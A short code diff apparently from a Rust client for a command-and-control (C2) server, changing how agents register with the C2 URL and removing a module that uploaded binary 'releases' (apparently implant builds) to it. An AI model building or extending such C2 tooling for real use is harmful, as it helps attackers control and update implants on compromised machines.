@@ -32,7 +32,7 @@ pub mod agents {
         let response = ureq::post(&format!("{C2_URL}/agents")).send_json(model::Agent {
             id: Default::default(),
             name,
-            identity: identity.to_bytes(),
+            identity,
             platform,
             created_at: Default::default(),
             last_seen_at: Default::default(),
@@ -148,26 +148,6 @@ pub mod missions {
 
         if response.status() != 202 {
             log::error!("Failed to report mission [{}]: {:#?}", mission.id, response);
-        }
-        Ok(())
-    }
-}
-
-pub mod releases {
-    use super::*;
-
-    pub fn create(checksum: &str, platform: model::Platform, bytes: &[u8]) -> ClientResult<()> {
-        let response = ureq::post(&format!("{C2_URL}/releases")).send_json(model::Release {
-            checksum: checksum.to_string(),
-            platform,
-            bytes: bytes.to_vec(),
-            created_at: Default::default(),
-        })?;
-
-        if response.status() == 201 {
-            println!("Release created");
-        } else {
-            eprintln!("Failed to create release");
         }
         Ok(())
     }
